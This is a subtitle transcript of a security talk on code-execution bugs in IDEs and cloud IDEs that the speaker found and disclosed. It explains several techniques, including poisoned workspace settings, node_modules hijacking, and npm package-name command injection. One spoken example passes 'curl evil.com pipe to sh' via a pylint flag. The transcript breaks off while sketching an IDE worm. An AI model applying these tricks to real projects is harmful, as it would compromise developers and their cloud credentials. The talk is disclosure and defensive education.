1
00:00:00,000 --> 00:00:01,300
- Hi everyone, I'm David.

2
00:00:01,300 --> 00:00:03,800
And today, we're going to
talk about hacking IDEs.

3
00:00:05,270 --> 00:00:06,585
First a little bit about myself.

4
00:00:06,585 --> 00:00:08,530
I'm a security engineer at Google,

5
00:00:08,530 --> 00:00:09,946
where I work on web security.

6
00:00:09,946 --> 00:00:14,098
I'm focused both on developing
new web security features

7
00:00:14,098 --> 00:00:17,723
along with figuring out how
to you deploy them at scale.

8
00:00:18,630 --> 00:00:19,463
Outside of work,

9
00:00:19,463 --> 00:00:22,230
I really enjoy hacking in
both senses of the word.

10
00:00:22,230 --> 00:00:24,140
So I enjoy programming,

11
00:00:24,140 --> 00:00:26,230
working on silly programming projects,

12
00:00:26,230 --> 00:00:28,940
just for the joy of creating something,

13
00:00:28,940 --> 00:00:31,370
as much as I enjoy
finding vulnerabilities,

14
00:00:31,370 --> 00:00:34,871
taking things apart and
working on bug bounties.

15
00:00:34,871 --> 00:00:36,830
So during the pandemic,

16
00:00:36,830 --> 00:00:38,360
I have a couple of months free

17
00:00:38,360 --> 00:00:40,070
when I was originally
supposed to be taking time off

18
00:00:40,070 --> 00:00:41,410
to go traveling.

19
00:00:41,410 --> 00:00:45,560
And I spent a few months
looking into IDE security.

20
00:00:45,560 --> 00:00:48,680
And I found and reported
30 or 40 different bugs

21
00:00:48,680 --> 00:00:50,630
in a bunch of different IDEs.

22
00:00:50,630 --> 00:00:53,550
So today I want to go
through a whirlwind tour

23
00:00:53,550 --> 00:00:55,182
of a bunch of these bugs.

24
00:00:55,182 --> 00:00:56,768
And one thing to note here,

25
00:00:56,768 --> 00:00:58,860
all of the bugs in this presentation

26
00:00:58,860 --> 00:01:02,072
have either been fixed, or
declared working as intended.

27
00:01:02,072 --> 00:01:04,080
So why hack developers?

28
00:01:04,080 --> 00:01:08,030
If you go after your standard
production infrastructure,

29
00:01:08,030 --> 00:01:09,620
that's likely to be heavily hardened.

30
00:01:09,620 --> 00:01:12,320
And everyone thinks about
attacking production.

31
00:01:12,320 --> 00:01:13,981
And because of that,

32
00:01:13,981 --> 00:01:16,700
that's where defenders put a
lot of time and effort into.

33
00:01:16,700 --> 00:01:20,220
Developers, on the other
hand, are less common target.

34
00:01:20,220 --> 00:01:23,282
So chances are, they are not
as hardened as production.

35
00:01:23,282 --> 00:01:26,580
But because they're the
creators of production,

36
00:01:26,580 --> 00:01:29,180
they maintain it, and push new code to it,

37
00:01:29,180 --> 00:01:32,960
oftentimes developers have the
ability to access production.

38
00:01:32,960 --> 00:01:34,030
So if you can hack them,

39
00:01:34,030 --> 00:01:37,720
you can then use their credentials
to pivot into production.

40
00:01:37,720 --> 00:01:40,510
IDEs specifically are a
really interesting target

41
00:01:40,510 --> 00:01:41,610
in my opinion,

42
00:01:41,610 --> 00:01:42,443
because they've been getting

43
00:01:42,443 --> 00:01:44,980
more and more complex over time.

44
00:01:44,980 --> 00:01:47,870
An IDE is no longer just a text editor.

45
00:01:47,870 --> 00:01:50,780
Now it includes so many
different fancy tools

46
00:01:50,780 --> 00:01:52,340
to provide auto-complete,

47
00:01:52,340 --> 00:01:55,150
to use AI auto-complete,

48
00:01:55,150 --> 00:01:58,810
to integrate with any
tool you can imagine.

49
00:01:58,810 --> 00:02:00,840
And whenever you have
all those integrations,

50
00:02:00,840 --> 00:02:02,743
you're more likely to have bugs.

51
00:02:04,077 --> 00:02:06,300
If you ask your average developer,

52
00:02:06,300 --> 00:02:08,580
or even your average security person,

53
00:02:08,580 --> 00:02:10,450
where the security boundary is

54
00:02:10,450 --> 00:02:13,540
when they open up something
that they don't trust,

55
00:02:13,540 --> 00:02:16,040
they're likely to point to the run button.

56
00:02:16,040 --> 00:02:17,130
So in this case,

57
00:02:17,130 --> 00:02:19,730
I personally would've
thought if I don't hit run,

58
00:02:19,730 --> 00:02:23,070
it would be totally safe to
open up this random folder,

59
00:02:23,070 --> 00:02:26,050
and look at some of
the codes inside of it.

60
00:02:26,050 --> 00:02:28,690
But it turns out, most IDEs,

61
00:02:28,690 --> 00:02:31,140
at least you use to see
the security boundary,

62
00:02:31,140 --> 00:02:33,143
is just opening something to view it.

63
00:02:34,536 --> 00:02:37,420
And what makes this especially impactful,

64
00:02:37,420 --> 00:02:41,290
is the fact that IDEs
are extremely popular.

65
00:02:41,290 --> 00:02:44,480
Over half of all developers use Vscode,

66
00:02:44,480 --> 00:02:48,680
one popular IDE that's made
using a kind of web stack.

67
00:02:48,680 --> 00:02:51,320
It's built in HTML and JavaScript.

68
00:02:51,320 --> 00:02:53,885
So if you have a bug just in Vscode,

69
00:02:53,885 --> 00:02:55,440
you already have the ability

70
00:02:55,440 --> 00:02:57,770
to target half of all developers.

71
00:02:57,770 --> 00:02:59,360
And then there are a couple of others

72
00:02:59,360 --> 00:03:01,640
that once you find the
way to attack those,

73
00:03:01,640 --> 00:03:03,890
the number of developers you can attack

74
00:03:03,890 --> 00:03:05,934
just continues to go up.

75
00:03:05,934 --> 00:03:07,690
When the pandemic hit,

76
00:03:07,690 --> 00:03:09,380
I ended up with a lot of free time,

77
00:03:09,380 --> 00:03:11,130
because I had plans to go traveling,

78
00:03:11,130 --> 00:03:13,420
and that wasn't happening.

79
00:03:13,420 --> 00:03:15,720
So I started to look into Vscode,

80
00:03:15,720 --> 00:03:18,793
just because it's one that
I personally use a lot.

81
00:03:18,793 --> 00:03:22,498
One really common
vulnerability pattern in Vscode

82
00:03:22,498 --> 00:03:25,380
stems from workspace settings.

83
00:03:25,380 --> 00:03:29,850
So vs code allows two different
ways to configure settings.

84
00:03:29,850 --> 00:03:32,000
You have your standard user settings,

85
00:03:32,000 --> 00:03:34,670
which apply to everything
on your computer,

86
00:03:34,670 --> 00:03:37,420
but there are also workspace settings.

87
00:03:37,420 --> 00:03:38,710
And workspace settings

88
00:03:38,710 --> 00:03:41,830
are specific to a directory that you open.

89
00:03:41,830 --> 00:03:44,349
And the really interesting
thing about workspace settings

90
00:03:44,349 --> 00:03:47,410
is the settings file is actually stored

91
00:03:47,410 --> 00:03:48,900
inside of this magic

92
00:03:48,900 --> 00:03:52,660
dot vscode slash settings dot json file,

93
00:03:52,660 --> 00:03:54,480
inside of the project.

94
00:03:54,480 --> 00:03:56,765
So if you download some
git repo off the internet,

95
00:03:56,765 --> 00:03:59,480
and open it up in Vscode,

96
00:03:59,480 --> 00:04:02,510
it can supply its own workspace settings.

97
00:04:02,510 --> 00:04:04,193
So this is a really useful feature,

98
00:04:04,193 --> 00:04:07,493
because it allows projects
to configure themselves

99
00:04:07,493 --> 00:04:10,881
in a way that makes
them easy to work with.

100
00:04:10,881 --> 00:04:14,160
Where this goes wrong is that Vscode,

101
00:04:14,160 --> 00:04:17,319
and a lot of the Vscode
extensions, have settings

102
00:04:17,319 --> 00:04:19,000
that are actually not safe

103
00:04:19,000 --> 00:04:21,850
to be configured by an untrusted party.

104
00:04:21,850 --> 00:04:24,420
So this isn't just changing the font size,

105
00:04:24,420 --> 00:04:26,520
or changing benign the settings.

106
00:04:26,520 --> 00:04:27,353
There are settings

107
00:04:27,353 --> 00:04:29,944
that actually can turn
into code execution.

108
00:04:29,944 --> 00:04:31,590
So for example,

109
00:04:31,590 --> 00:04:34,550
the Python Vscode
extension made it possible

110
00:04:34,550 --> 00:04:38,404
to override the path to the Flake8 binary.

111
00:04:38,404 --> 00:04:41,190
Flake8 is a common Python linter.

112
00:04:41,190 --> 00:04:45,070
So it's meant to give you errors
of your lines are too long,

113
00:04:45,070 --> 00:04:47,920
But by overriding the Flake8 path,

114
00:04:47,920 --> 00:04:51,430
to a binary included inside of a project,

115
00:04:51,430 --> 00:04:55,400
it was possible to convince
the Python Vscode extension

116
00:04:55,400 --> 00:04:58,900
to start executing code
included in the project,

117
00:04:58,900 --> 00:05:00,950
as soon as you view a file,

118
00:05:00,950 --> 00:05:04,790
because the linter runs as
soon as you view a file.

119
00:05:04,790 --> 00:05:05,760
So this is scary,

120
00:05:05,760 --> 00:05:07,530
because it means viewing a file

121
00:05:07,530 --> 00:05:10,710
just to try to understand
what a project is,

122
00:05:10,710 --> 00:05:12,800
for example, opening up a POC

123
00:05:12,800 --> 00:05:14,820
you download off the internet,

124
00:05:14,820 --> 00:05:17,646
isn't actually safe in the face of this.

125
00:05:17,646 --> 00:05:21,180
One really useful tool I use
throughout all of this research

126
00:05:21,180 --> 00:05:23,270
was Strace.

127
00:05:23,270 --> 00:05:26,911
Strace is this amazing tool
that allows you to run a command

128
00:05:26,911 --> 00:05:30,370
and log all of the sys
calls that it makes.

129
00:05:30,370 --> 00:05:33,260
Sys calls are how commands or programs

130
00:05:33,260 --> 00:05:35,300
interact with the operating system,

131
00:05:35,300 --> 00:05:38,300
and thus interact with any
other resource on the computer.

132
00:05:38,300 --> 00:05:41,560
So every time they want
to start a new process,

133
00:05:41,560 --> 00:05:44,820
open a thread, open a
file, anything like that,

134
00:05:44,820 --> 00:05:47,410
that has to go through a sys call.

135
00:05:47,410 --> 00:05:51,210
So for example, if we wanted
to run Vscode via Strace,

136
00:05:51,210 --> 00:05:52,850
we would just run this,

137
00:05:52,850 --> 00:05:55,366
and then we'd be able to
look at all of the sys calls

138
00:05:55,366 --> 00:05:56,330
that it makes.

139
00:05:56,330 --> 00:05:58,460
What's so about this is,

140
00:05:58,460 --> 00:06:02,970
it allows you to understand the
actual behavior of a program

141
00:06:02,970 --> 00:06:05,810
without having to read
all of the source code.

142
00:06:05,810 --> 00:06:08,590
IDEs are huge, and it just isn't practical

143
00:06:08,590 --> 00:06:10,800
to read every line of the source.

144
00:06:10,800 --> 00:06:13,360
But it is practical to
review the sys calls,

145
00:06:13,360 --> 00:06:16,690
and use that to understand how it works.

146
00:06:16,690 --> 00:06:20,090
So for example, you can cat this file,

147
00:06:20,090 --> 00:06:21,513
and grep for ENOENT.

148
00:06:22,720 --> 00:06:25,580
ENOENT is the return code that you get

149
00:06:25,580 --> 00:06:28,670
if you try to open a
file that doesn't exist.

150
00:06:28,670 --> 00:06:30,742
So this allows you to know

151
00:06:30,742 --> 00:06:34,180
that Vscode tried to open a
file, but it didn't exist.

152
00:06:34,180 --> 00:06:35,013
And thus,

153
00:06:35,013 --> 00:06:37,200
there might be some kind of
special behavior for this.

154
00:06:37,200 --> 00:06:39,737
For example, it might be
opening a config file,

155
00:06:39,737 --> 00:06:42,373
and you might be able to
poison that config file.

156
00:06:43,570 --> 00:06:46,350
You can also just grep
for the open sys calls.

157
00:06:46,350 --> 00:06:48,730
So this would find every
file that it opens,

158
00:06:48,730 --> 00:06:50,283
whether it exists or not.

159
00:06:51,330 --> 00:06:52,480
Another really useful one

160
00:06:52,480 --> 00:06:55,180
is grepping for the exec sys call.

161
00:06:55,180 --> 00:06:57,650
So this is how you launch another process

162
00:06:57,650 --> 00:06:59,140
running another command.

163
00:06:59,140 --> 00:07:00,120
So this makes it possible

164
00:07:00,120 --> 00:07:01,455
to look for kind of your standard

165
00:07:01,455 --> 00:07:04,132
command injection style attacks.

166
00:07:04,132 --> 00:07:05,940
One bug I found with this

167
00:07:05,940 --> 00:07:10,610
was a common one in a lot of
JavaScript-based extensions,

168
00:07:10,610 --> 00:07:14,670
where most Vscode extensions
are developed in JavaScript.

169
00:07:14,670 --> 00:07:16,370
And the default behavior,

170
00:07:16,370 --> 00:07:20,570
is that it will attempt to
load the node modules folder

171
00:07:20,570 --> 00:07:24,004
in order to find the
dependencies of that extension.

172
00:07:24,004 --> 00:07:26,940
But where this goes wrong
is it will first attempt

173
00:07:26,940 --> 00:07:28,820
to load the node modules folder

174
00:07:28,820 --> 00:07:31,170
from the currently open project.

175
00:07:31,170 --> 00:07:34,620
So in this case, this
was the JSHint extension,

176
00:07:34,620 --> 00:07:36,030
which is another linter.

177
00:07:36,030 --> 00:07:38,407
So it runs as soon as you open a file,

178
00:07:38,407 --> 00:07:40,170
and we see that it attempted

179
00:07:40,170 --> 00:07:44,150
to open the node modules slash JSHint file

180
00:07:44,150 --> 00:07:47,170
within the currently open directory.

181
00:07:47,170 --> 00:07:48,640
So what this means is,

182
00:07:48,640 --> 00:07:51,090
we can just put our own code in there,

183
00:07:51,090 --> 00:07:53,170
some malicious JavaScript,

184
00:07:53,170 --> 00:07:55,610
and it will helpfully
just go and execute that

185
00:07:55,610 --> 00:07:57,030
as soon as you open a file,

186
00:07:57,030 --> 00:07:59,093
when it tries to provide linter support.

187
00:08:00,056 --> 00:08:02,790
Another one also found via Strace

188
00:08:02,790 --> 00:08:05,240
was a command injection bug,

189
00:08:05,240 --> 00:08:10,240
where NPM is a common
JavaScript package manager.

190
00:08:10,310 --> 00:08:12,760
And, in package dot JSON files,

191
00:08:12,760 --> 00:08:14,360
which is how NPM has configured,

192
00:08:15,483 --> 00:08:17,060
Vscode attempts to be helpful,

193
00:08:17,060 --> 00:08:19,173
and wants to provide you information

194
00:08:19,173 --> 00:08:22,130
on the dependencies you have installed.

195
00:08:22,130 --> 00:08:25,770
So it goes and takes every
dependency you have installed,

196
00:08:25,770 --> 00:08:28,510
and passes it into NPM_view.

197
00:08:28,510 --> 00:08:30,360
The key thing to note here

198
00:08:30,360 --> 00:08:33,671
is that it does not
escape the package name.

199
00:08:33,671 --> 00:08:37,670
So if you just have a package
named semicolon space,

200
00:08:37,670 --> 00:08:41,460
and then any command, it will
just start executing that.

201
00:08:41,460 --> 00:08:44,490
And this was just found
via running it with Strace,

202
00:08:44,490 --> 00:08:46,853
and looking for any time it runs exec.

203
00:08:49,360 --> 00:08:53,160
Moving on from Visual Studio
code to Visual Studio,

204
00:08:53,160 --> 00:08:57,370
which is a different IDE
also made by Microsoft.

205
00:08:57,370 --> 00:09:01,040
One bug I found in this
was with build configs.

206
00:09:01,040 --> 00:09:04,137
So Visual Studio supports CMake.

207
00:09:04,137 --> 00:09:07,530
CMake is kind of like Make
if you've ever used that.

208
00:09:07,530 --> 00:09:10,130
And it will by default run CMake,

209
00:09:10,130 --> 00:09:11,910
in order to provide auto complete

210
00:09:11,910 --> 00:09:13,373
for anything you open.

211
00:09:14,380 --> 00:09:17,400
Where this goes wrong is that
CMake provides the ability

212
00:09:17,400 --> 00:09:19,180
to execute a command.

213
00:09:19,180 --> 00:09:20,013
So in this case,

214
00:09:20,013 --> 00:09:23,560
you can just execute
process of evil dot bat,

215
00:09:23,560 --> 00:09:26,304
and that will run as soon
as anything is opened

216
00:09:26,304 --> 00:09:29,083
inside of Visual Studio.

217
00:09:29,083 --> 00:09:30,830
I reported this to Microsoft,

218
00:09:30,830 --> 00:09:34,580
and in contrast to all of the Vscode bugs,

219
00:09:34,580 --> 00:09:36,710
which were all treated very seriously,

220
00:09:36,710 --> 00:09:38,780
and promptly patched,

221
00:09:38,780 --> 00:09:42,250
their decision for this
was that this is by design,

222
00:09:42,250 --> 00:09:44,999
and there is no way to view
scripts in Visual Studio

223
00:09:44,999 --> 00:09:47,650
without also executing them.

224
00:09:47,650 --> 00:09:49,360
So this is a fair bit of warning

225
00:09:49,360 --> 00:09:53,244
that Vscode at least attempts to be safe

226
00:09:53,244 --> 00:09:56,090
when opening untrusted projects,

227
00:09:56,090 --> 00:09:57,803
but Visual Studio does not.

228
00:09:59,700 --> 00:10:00,995
Something really interesting happened

229
00:10:00,995 --> 00:10:03,150
a couple of months later.

230
00:10:03,150 --> 00:10:06,630
Google's threat analysis
group published a blog post

231
00:10:06,630 --> 00:10:08,830
that I was not involved with,

232
00:10:08,830 --> 00:10:10,970
about a North Korean threat actor

233
00:10:10,970 --> 00:10:14,610
that was targeting security researchers.

234
00:10:14,610 --> 00:10:15,450
And what they were doing

235
00:10:15,450 --> 00:10:17,820
was they were reaching out
to security researchers

236
00:10:17,820 --> 00:10:21,630
and asking for help
debugging their zero days.

237
00:10:21,630 --> 00:10:23,547
And if the researcher agreed,

238
00:10:23,547 --> 00:10:25,390
they would send them a zip file

239
00:10:25,390 --> 00:10:29,160
containing a Visual
Studio project to open up.

240
00:10:29,160 --> 00:10:31,750
And inside of this visual studio project,

241
00:10:31,750 --> 00:10:34,250
it used a very similar trick

242
00:10:34,250 --> 00:10:37,140
in order to get command code execution,

243
00:10:37,140 --> 00:10:39,130
as soon as it was opened,

244
00:10:39,130 --> 00:10:41,573
and then use that to comb the developer.

245
00:10:42,630 --> 00:10:44,070
What this shows in my opinion,

246
00:10:44,070 --> 00:10:46,180
is that this attack vector

247
00:10:46,180 --> 00:10:48,060
is not just a theoretical concern.

248
00:10:48,060 --> 00:10:51,200
This is something that actual APTs

249
00:10:51,200 --> 00:10:53,320
out in the real world are using,

250
00:10:53,320 --> 00:10:55,850
and they're using it to
attack security researchers,

251
00:10:55,850 --> 00:10:58,470
who are already relatively paranoid.

252
00:10:58,470 --> 00:11:00,710
So if you ever are given zip file,

253
00:11:00,710 --> 00:11:03,253
and told to open it by
someone saying, hey,

254
00:11:03,253 --> 00:11:07,453
I need some help, definitely
be suspicious about that.

255
00:11:08,642 --> 00:11:11,590
One historical bog that
I just want to cover

256
00:11:11,590 --> 00:11:14,580
that I think is so fascinating is a bug

257
00:11:14,580 --> 00:11:17,750
in IntelliJ from 2016,

258
00:11:17,750 --> 00:11:21,160
where this person found that IntelliJ

259
00:11:21,160 --> 00:11:23,970
had a locally listening web server,

260
00:11:23,970 --> 00:11:26,121
and that any website you open,

261
00:11:26,121 --> 00:11:28,447
could talk to that web server (inaudible),

262
00:11:29,708 --> 00:11:31,623
and ask it to open a project.

263
00:11:31,623 --> 00:11:34,400
And IntelliJ would then open this project,

264
00:11:34,400 --> 00:11:37,870
even a project downloaded
off of the internet,

265
00:11:37,870 --> 00:11:40,540
and then would execute a startup task

266
00:11:40,540 --> 00:11:42,596
contained within that project.

267
00:11:42,596 --> 00:11:44,040
So for example,

268
00:11:44,040 --> 00:11:47,494
this was their POC where
visiting local host

269
00:11:47,494 --> 00:11:51,163
was able to pop calculator
with zero interaction.

270
00:11:52,060 --> 00:11:53,800
What's interesting about this,

271
00:11:53,800 --> 00:11:56,150
is that when IntelliJ fixed this,

272
00:11:56,150 --> 00:11:58,760
they fixed this by preventing localhost,

273
00:11:58,760 --> 00:12:00,610
or any untrusted website,

274
00:12:00,610 --> 00:12:02,820
from interacting with IntelliJ.

275
00:12:02,820 --> 00:12:04,490
They didn't fix this

276
00:12:04,490 --> 00:12:07,150
by blocking the opening a project

277
00:12:07,150 --> 00:12:09,273
being equivalent to code execution vector.

278
00:12:10,200 --> 00:12:12,770
So I reached back out
to them to discuss this,

279
00:12:12,770 --> 00:12:15,270
using pretty much exactly the same vector,

280
00:12:15,270 --> 00:12:16,970
where you have a start-up task,

281
00:12:16,970 --> 00:12:19,420
and it can just execute any command.

282
00:12:19,420 --> 00:12:22,473
And this is a built-in
feature of IntelliJ.

283
00:12:23,350 --> 00:12:25,010
And their initial reply

284
00:12:25,010 --> 00:12:28,060
was that they haven't decided
what the fix should be,

285
00:12:28,060 --> 00:12:29,390
because they need to make a trade-off

286
00:12:29,390 --> 00:12:31,976
between security and convenience.

287
00:12:31,976 --> 00:12:34,490
And this was a really common pattern

288
00:12:34,490 --> 00:12:37,690
when talking to IDE developers,

289
00:12:37,690 --> 00:12:42,020
because IDE has tried to
make developers lives easier.

290
00:12:42,020 --> 00:12:43,680
They want to make it as efficient

291
00:12:43,680 --> 00:12:45,730
to make software as possible.

292
00:12:45,730 --> 00:12:48,670
And if you have to constantly
warn someone about this risk,

293
00:12:48,670 --> 00:12:52,128
this risk, or this risk, that's
going to annoy developers.

294
00:12:52,128 --> 00:12:55,840
Ultimately IntelliJ
did decide to fix this,

295
00:12:55,840 --> 00:12:58,890
and their fix is that
whenever you open a project

296
00:12:58,890 --> 00:13:00,570
for the first time,

297
00:13:00,570 --> 00:13:04,040
if it contains a startup
task, it warns you.

298
00:13:04,040 --> 00:13:06,930
And if you think that
these bugs only apply

299
00:13:06,930 --> 00:13:10,280
to large heavyweight IDEs like IntelliJ,

300
00:13:10,280 --> 00:13:12,370
you're sadly mistaken.

301
00:13:12,370 --> 00:13:15,820
So this was a fascinating bug from 2019,

302
00:13:15,820 --> 00:13:19,030
where VIM has a concept of mode lines,

303
00:13:19,030 --> 00:13:22,120
which are kind of analogous to Vscode,

304
00:13:22,120 --> 00:13:24,660
and it's workspace settings.

305
00:13:24,660 --> 00:13:25,960
And via mode lines,

306
00:13:25,960 --> 00:13:28,320
it turns out it was possible
to get code execution

307
00:13:28,320 --> 00:13:30,020
just from opening a file,

308
00:13:30,020 --> 00:13:32,440
again with zero user interaction,

309
00:13:32,440 --> 00:13:34,616
other than viewing a file.

310
00:13:34,616 --> 00:13:38,320
Tavis even found a great bug in Notepad,

311
00:13:38,320 --> 00:13:41,470
where it was possible to take
opening a file in Notepad,

312
00:13:41,470 --> 00:13:44,360
kind of the dumbest and
most basic of editors,

313
00:13:44,360 --> 00:13:46,463
and turn that into code execution.

314
00:13:48,220 --> 00:13:50,510
Where this gets even more
interesting, in my opinion,

315
00:13:50,510 --> 00:13:51,973
is online IDEs.

316
00:13:52,960 --> 00:13:54,383
There's a big shift nowadays,

317
00:13:54,383 --> 00:13:57,020
where companies are
trying to have developers

318
00:13:57,020 --> 00:14:00,660
use online IDEs that run in the cloud.

319
00:14:00,660 --> 00:14:01,610
The idea behind this

320
00:14:01,610 --> 00:14:04,140
is that rather than
running everything locally

321
00:14:04,140 --> 00:14:06,330
with limited resources on a laptop,

322
00:14:06,330 --> 00:14:08,700
and having to worry about internet speed,

323
00:14:08,700 --> 00:14:11,969
processor speed, and
provisioning enough resources,

324
00:14:11,969 --> 00:14:15,840
developers can essentially
be given a virtual machine

325
00:14:15,840 --> 00:14:19,160
in the cloud, that their
IDE runs inside of.

326
00:14:19,160 --> 00:14:23,140
So Google Cloud Shell, Azure, AWS, GitHub,

327
00:14:23,140 --> 00:14:26,575
all of these companies have
their own solution for this.

328
00:14:26,575 --> 00:14:29,630
What makes these really
interesting in my opinion

329
00:14:29,630 --> 00:14:33,540
is that they all include
built-in cloud credentials,

330
00:14:33,540 --> 00:14:36,880
Google Cloud, Cloud9, Azure.

331
00:14:36,880 --> 00:14:37,739
And what this means is,

332
00:14:37,739 --> 00:14:40,070
if you manage to get code execution

333
00:14:40,070 --> 00:14:42,400
inside of one of these VMs,

334
00:14:42,400 --> 00:14:46,560
it is already authenticated to
access anything in the cloud

335
00:14:46,560 --> 00:14:49,180
that that developer has access to.

336
00:14:49,180 --> 00:14:51,750
So that makes these a
really impactful target,

337
00:14:51,750 --> 00:14:53,363
from a security perspective.

338
00:14:55,450 --> 00:14:59,130
I found a really fun bug
inside of Google Cloud Shell.

339
00:14:59,130 --> 00:15:04,090
So Google Cloud Shell is
built on top of Eclipse Theia.

340
00:15:04,090 --> 00:15:07,315
Eclipse Theia is an open source web IDE.

341
00:15:07,315 --> 00:15:10,560
And Eclipse Theia, has support for Ruby,

342
00:15:10,560 --> 00:15:12,913
via the Theia Ruby extension.

343
00:15:13,750 --> 00:15:15,142
And the Theia Ruby extension

344
00:15:15,142 --> 00:15:17,520
is then built on top of Solargraph,

345
00:15:17,520 --> 00:15:19,460
which is an open source project

346
00:15:19,460 --> 00:15:22,600
maintained by a single person.

347
00:15:22,600 --> 00:15:24,640
So what's kind of interesting about this,

348
00:15:24,640 --> 00:15:26,710
is that Google Cloud Shell,

349
00:15:26,710 --> 00:15:30,010
which has very strict
security requirements,

350
00:15:30,010 --> 00:15:33,700
three levels down is depending
on an open source thing

351
00:15:33,700 --> 00:15:36,652
that they really don't have
very much influence over.

352
00:15:36,652 --> 00:15:39,270
So when I started reading
the Solargraph code,

353
00:15:39,270 --> 00:15:40,850
I found this hack.

354
00:15:40,850 --> 00:15:43,330
Evaluating gemspec files

355
00:15:43,330 --> 00:15:46,890
violates the goal of not
running workspace code,

356
00:15:46,890 --> 00:15:50,973
but this is how gem specification
dot load does it anyway.

357
00:15:50,973 --> 00:15:54,020
And then you see it reads
a file and evaluates it.

358
00:15:54,020 --> 00:15:56,300
So what this means is,

359
00:15:56,300 --> 00:15:57,790
if someone opens something

360
00:15:57,790 --> 00:16:01,520
inside of their online Cloud Shell IDE,

361
00:16:01,520 --> 00:16:03,970
and it contains the gemspec file,

362
00:16:03,970 --> 00:16:06,800
it immediately evaluates that Ruby code,

363
00:16:06,800 --> 00:16:07,800
and that Ruby code

364
00:16:07,800 --> 00:16:10,800
can then start stealing
the cloud credentials,

365
00:16:10,800 --> 00:16:12,823
and acting as that user.

366
00:16:14,092 --> 00:16:15,830
There was a similar bug

367
00:16:15,830 --> 00:16:17,606
in the TypeScript language server also,

368
00:16:17,606 --> 00:16:20,093
where TypeScript made it possible

369
00:16:20,093 --> 00:16:23,750
to specify additional compiler plugins

370
00:16:23,750 --> 00:16:27,430
that provide support for
different language features.

371
00:16:27,430 --> 00:16:30,070
And this in theory, it should be safe,

372
00:16:30,070 --> 00:16:31,360
because all of these plugins

373
00:16:31,360 --> 00:16:35,670
are loaded from slash VAR
slash, and somewhere in there.

374
00:16:35,670 --> 00:16:38,861
But the classic dot dot slash trick

375
00:16:38,861 --> 00:16:41,233
actually just worked totally fine here.

376
00:16:41,233 --> 00:16:43,799
What both of these
vulnerabilities have in common,

377
00:16:43,799 --> 00:16:45,570
is that they both stem

378
00:16:45,570 --> 00:16:49,540
from a very, very sensitive application,

379
00:16:49,540 --> 00:16:51,356
in this case, Google Cloud Shell,

380
00:16:51,356 --> 00:16:55,617
using dependencies that have
a very different threat model.

381
00:16:55,617 --> 00:16:59,120
So Google Cloud Shell, it's
important that opening something

382
00:16:59,120 --> 00:17:01,483
does not turn into code execution.

383
00:17:01,483 --> 00:17:03,840
But for these other dependencies

384
00:17:03,840 --> 00:17:06,554
oftentimes made by a
single person somewhere,

385
00:17:06,554 --> 00:17:09,063
this is actually an important barrier.

386
00:17:10,800 --> 00:17:13,720
AWS Cloud9 also had a very similar bug,

387
00:17:13,720 --> 00:17:15,868
where it, similar to Vscode,

388
00:17:15,868 --> 00:17:19,864
allows a project to
include its own settings.

389
00:17:19,864 --> 00:17:21,400
And one of the settings

390
00:17:21,400 --> 00:17:22,904
that it allows a project to configure

391
00:17:22,904 --> 00:17:24,981
is a bunch of pylint flags.

392
00:17:24,981 --> 00:17:27,113
Pylint is another linter.

393
00:17:27,113 --> 00:17:29,220
This is a very common vector,

394
00:17:29,220 --> 00:17:30,980
because linters always execute

395
00:17:30,980 --> 00:17:33,320
as soon as you view a file.

396
00:17:33,320 --> 00:17:36,297
And inside of these
included workspace settings,

397
00:17:36,297 --> 00:17:39,060
you could provide pylint flags.

398
00:17:39,060 --> 00:17:40,020
And the interesting thing

399
00:17:40,020 --> 00:17:43,340
is that pylint supports a
kind of bizarre feature,

400
00:17:43,340 --> 00:17:47,170
where you can pass it an
arbitrary expression to evaluate,

401
00:17:47,170 --> 00:17:48,660
and it will use that expression

402
00:17:48,660 --> 00:17:52,760
to score how well your code
adheres to a coding style.

403
00:17:52,760 --> 00:17:53,593
So in this case,

404
00:17:53,593 --> 00:17:58,030
you can just pass a curl
evil.com pipe to sh,

405
00:17:58,030 --> 00:18:00,090
and that worked just fine.

406
00:18:00,090 --> 00:18:03,868
GitHub Code Spaces is another
one of these online IDEs.

407
00:18:03,868 --> 00:18:05,495
From a security perspective,

408
00:18:05,495 --> 00:18:08,520
GitHub code spaces has
a really clever design,

409
00:18:08,520 --> 00:18:10,060
in my opinion.

410
00:18:10,060 --> 00:18:13,396
Rather than trying to prevent
code execution from happening.

411
00:18:13,396 --> 00:18:17,360
It runs every project in an isolated VM.

412
00:18:17,360 --> 00:18:19,260
And the idea is that one VM,

413
00:18:19,260 --> 00:18:21,904
containing one code
space for one repository,

414
00:18:21,904 --> 00:18:25,373
can't interact or interfere
with any other VM.

415
00:18:26,690 --> 00:18:27,854
Where this goes wrong,

416
00:18:27,854 --> 00:18:29,930
is that GitHub Code Space

417
00:18:29,930 --> 00:18:32,337
has had a concept of settings sync.

418
00:18:32,337 --> 00:18:34,490
And settings sync made it possible

419
00:18:34,490 --> 00:18:37,230
to configure settings for one Code Space,

420
00:18:37,230 --> 00:18:40,190
and have these get sent
to every other Code Space.

421
00:18:40,190 --> 00:18:42,690
So this was a feature
meant to be used for things

422
00:18:42,690 --> 00:18:45,270
like changing the font size.

423
00:18:45,270 --> 00:18:47,240
But where this went wrong is,

424
00:18:47,240 --> 00:18:49,720
if you opened an untrusted repository

425
00:18:49,720 --> 00:18:51,800
in GitHub Code Spaces,

426
00:18:51,800 --> 00:18:55,250
that untrusted repository
could easily get code execution

427
00:18:55,250 --> 00:18:57,555
inside of that isolated VM.

428
00:18:57,555 --> 00:19:00,040
And then it could configure settings

429
00:19:00,040 --> 00:19:02,240
for that entire code space.

430
00:19:02,240 --> 00:19:05,496
And those settings would then
be synced everywhere else.

431
00:19:05,496 --> 00:19:07,630
And it turns out it was really easy

432
00:19:07,630 --> 00:19:09,680
to go and use those settings

433
00:19:09,680 --> 00:19:13,443
in order to sync command
execution across VMs.

434
00:19:15,558 --> 00:19:18,660
The part that is
absolutely terrifying to me

435
00:19:18,660 --> 00:19:20,247
about all of this is,

436
00:19:20,247 --> 00:19:23,640
what happens if someone writes a worm?

437
00:19:23,640 --> 00:19:27,577
So the idea is, you start with
one developer, one person,

438
00:19:27,577 --> 00:19:31,320
who has somehow been compromised,

439
00:19:31,320 --> 00:19:35,479
and they can push a bunch
of malicious IDE configs

440
00:19:35,479 --> 00:19:37,850
to one repository

441
00:19:37,850 --> 00:19:40,840
And you push vulnerabilities and exploits

442
00:19:40,840 --> 00:19:43,240
for all of the ones we've
talked about and more.

443
00:19:44,090 --> 00:19:46,460
And then people are going
to start viewing that,

444
00:19:46,460 --> 00:19:49,500
and they're going to start
looking at that one repository.

445
